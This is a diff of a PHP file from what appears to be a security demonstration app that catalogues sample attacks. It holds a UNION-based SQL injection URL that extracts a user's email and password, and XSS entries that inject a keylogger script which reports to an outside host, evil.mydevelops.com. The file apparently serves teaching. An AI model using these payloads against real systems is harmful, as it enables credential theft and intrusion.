@@ -1,17 +1,9 @@
 <?php
 include_once("init.php");
 
-$search = $_GET['keyword'];
-
 $attacks = array();
-$attacks[0] = array(
-    "name" => "SQL Injection",
-    "description" => "Show value of item 2 instead of nothing",
-    "value" => "product.php?id=0' OR id=2 --",
-    "attack" => "product.php?id=0'%20OR%20id=2--"
-); 
 
-$attacks[1] = array(
+$attacks[0] = array(
     "name" => "SQL Injection",
     "description" => "Show email and password for a user with id 1",
     "value" => "product.php?id=0' UNION SELECT 'bla', email as name, pw as description, 'bla' FROM users WHERE id=1 --",
@@ -43,17 +35,10 @@ window.setInterval(function() {
 
 //$xss = trim(preg_replace('/\s\s+/', ' ', $xss));
 
-$attacks[2] = array(
-    "name" => "XSS attack",
-    "description" => "Log your pressed keys",
-    "value" => "Complex javascript written special for a keylogger. Results can be seen <a href='http://evil.mydevelops.com'>here</a>.",
-    "attack" => "listing.php?search=No risk, No fun. I don recommend using this app, because it can be harmfull!<script>".$xss."</script>"
-);
-
-$attacks[3] = array(
-    "name" => "XSS attack",
+$attacks[1] = array(
+    "name" => "Cross-Site Scripting (XSS)",
     "description" => "Steal your password on login site!",
-    "value" => "Complex javascript written special for a keylogger. Results can be seen <a href='http://evil.mydevelops.com'>here</a>.",
+    "value" => "index.php?message=&lt;script&gt;XSS-SCRIPT&lt;/script&gt;<br> Complex javascript written special for a keylogger. Results can be seen <a href='http://evil.mydevelops.com'>here</a>.",
     "attack" => "index.php?message=<script>".$xss."</script>"
 );
 
